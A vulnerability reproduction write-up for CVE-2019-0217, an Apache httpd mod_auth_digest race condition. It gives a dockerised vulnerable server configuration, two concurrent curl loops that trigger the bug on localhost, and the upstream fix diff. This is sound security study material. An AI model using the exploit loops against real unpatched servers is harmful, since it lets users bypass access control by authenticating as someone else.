# CVE-2019-0217

## Description

In Apache HTTP Server 2.4 release 2.4.38 and prior, a race condition in mod_auth_digest when running in a threaded server could allow a user with valid credentials to authenticate using another username, bypassing configured access control restrictions.

## Setup

1. In the [vuln-httpd](../vuln-httpd/) directory, the docker-compose file is present, which will setup the vulnerable Apache HTTP Server.

2. There are a couple important points to note (important, rest is in [httpd.conf](vuln-httpd/httpd.conf)):
    1. The server is running on a threaded server, using the mpm_event module.

    ```apache
        LoadModule mpm_event_module modules/mod_mpm_event.so
        LoadModule cgid_module modules/mod_cgid.so # as it is required by mpm_event
        <IfModule mpm_event_module>
            StartServers             2
            MinSpareThreads         25
            MaxSpareThreads         75
            ThreadLimit             64
            ThreadsPerChild         25
            MaxRequestWorkers      150
            MaxConnectionsPerChild   0
        </IfModule>
        ```

    2. The server is configured to use mod_auth_digest for authentication.

        ```apache
        LoadModule authn_file_module modules/mod_authn_file.so
        LoadModule authn_core_module modules/mod_authn_core.so
        LoadModule authz_host_module modules/mod_authz_host.so
        LoadModule authz_user_module modules/mod_authz_user.so
        LoadModule authz_core_module modules/mod_authz_core.so
        LoadModule auth_digest_module modules/mod_auth_digest.so
        LoadModule alias_module modules/mod_alias.so
        LoadModule mime_module modules/mod_mime.so
        ```

    3. We have setup a protected endpoint, and created two users with username:pasword `test:test` and `test2:test2`

        ```apache
        <Directory "/usr/local/apache2/htdocs/cgi-bin">
            AllowOverride None
            Options +ExecCGI
            AuthType Digest
            AuthName "protected-area"
            AuthDigestProvider file
            AuthUserFile "/usr/local/apache2/conf/digest_passwd"
            Require valid-user
        </Directory>
        ```

3. Build & run the project with docker

    ```bash
    docker-compose up --build
    ```

4. The server is running on `http://localhost:8080`

## Exploit

Basically the exploit is to send two requests simultaneously, and what happens is that sometimes the realmhash of one user is used to authenticate another user.

```bash
while true
do
    curl -u test2:test2 --digest "http://localhost:8080/cgi-bin/mycgi.cgi"
done
```

```bash
while true
do
    curl -u test:test --digest "http://localhost:8080/cgi-bin/mycgi.cgi"
done
```

And sometimes we'll get a 401 error which will indicate that the race condition was triggered.

## Explanation

The bug occured a the hash was not stored per request, this it was susceptible to a race condition. This was reported in the [Apache Bugzilla](https://bz.apache.org/bugzilla/show_bug.cgi?id=63124) and was fixed and backported to 2.4 in 2.4.39.

The patch which fixed this essentially moved the ha1 to digest_header_rec, which is request specific, and thus the vulnerability was fixed.


<details>
<summary>Patch</summary>

```diff
--- httpd-2.4.37/modules/aaa/mod_auth_digest.c	2019-01-29 11:05:15.603614489 +0100
+++ httpd-2.4.37.new/modules/aaa/mod_auth_digest.c	2019-01-29 11:06:24.587102281 +0100
@@ -92,7 +92,6 @@
     int          check_nc;
     const char  *algorithm;
     char        *uri_list;
-    const char  *ha1;
 } digest_config_rec;
 
 
@@ -153,6 +152,7 @@
     apr_time_t            nonce_time;
     enum hdr_sts          auth_hdr_sts;
     int                   needed_auth;
+    const char           *ha1;
     client_entry         *client;
 } digest_header_rec;
 
@@ -1304,7 +1304,7 @@
  */
 
 static authn_status get_hash(request_rec *r, const char *user,
-                             digest_config_rec *conf)
+                             digest_config_rec *conf, char **rethash)
 {
     authn_status auth_result;
     char *password;
@@ -1356,7 +1356,7 @@
     } while (current_provider);
 
     if (auth_result == AUTH_USER_FOUND) {
-        conf->ha1 = password;
+        *rethash = password;
     }
 
     return auth_result;
@@ -1483,25 +1483,24 @@
 
 /* RFC-2069 */
 static const char *old_digest(const request_rec *r,
-                              const digest_header_rec *resp, const char *ha1)
+                              const digest_header_rec *resp)
 {
     const char *ha2;
 
     ha2 = ap_md5(r->pool, (unsigned char *)apr_pstrcat(r->pool, resp->method, ":",
                                                        resp->uri, NULL));
     return ap_md5(r->pool,
-                  (unsigned char *)apr_pstrcat(r->pool, ha1, ":", resp->nonce,
-                                              ":", ha2, NULL));
+                  (unsigned char *)apr_pstrcat(r->pool, resp->ha1, ":",
+                                               resp->nonce, ":", ha2, NULL));
 }
 
 /* RFC-2617 */
 static const char *new_digest(const request_rec *r,
-                              digest_header_rec *resp,
-                              const digest_config_rec *conf)
+                              digest_header_rec *resp)
 {
     const char *ha1, *ha2, *a2;
 
-    ha1 = conf->ha1;
+    ha1 = resp->ha1;
 
     a2 = apr_pstrcat(r->pool, resp->method, ":", resp->uri, NULL);
     ha2 = ap_md5(r->pool, (const unsigned char *)a2);
@@ -1512,6 +1511,7 @@
                                                resp->cnonce, ":",
                                                resp->message_qop, ":", ha2,
                                                NULL));
+
 }
 
 
@@ -1767,7 +1767,7 @@
         return HTTP_UNAUTHORIZED;
     }
 
-    return_code = get_hash(r, r->user, conf);
+    return_code = get_hash(r, r->user, conf, &resp->ha1);
 
     if (return_code == AUTH_USER_NOT_FOUND) {
         ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(01790)
@@ -1797,7 +1797,7 @@
 
     if (resp->message_qop == NULL) {
         /* old (rfc-2069) style digest */
-        if (strcmp(resp->digest, old_digest(r, resp, conf->ha1))) {
+        if (strcmp(resp->digest, old_digest(r, resp))) {
             ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(01792)
                           "user %s: password mismatch: %s", r->user,
                           r->uri);
@@ -1827,7 +1827,7 @@
             return HTTP_UNAUTHORIZED;
         }
 
-        exp_digest = new_digest(r, resp, conf);
+        exp_digest = new_digest(r, resp);
         if (!exp_digest) {
             /* we failed to allocate a client struct */
             return HTTP_INTERNAL_SERVER_ERROR;
@@ -1911,7 +1911,7 @@
 
         /* calculate rspauth attribute
          */
-        ha1 = conf->ha1;
+        ha1 = resp->ha1;
 
         a2 = apr_pstrcat(r->pool, ":", resp->uri, NULL);
         ha2 = ap_md5(r->pool, (const unsigned char *)a2);
```
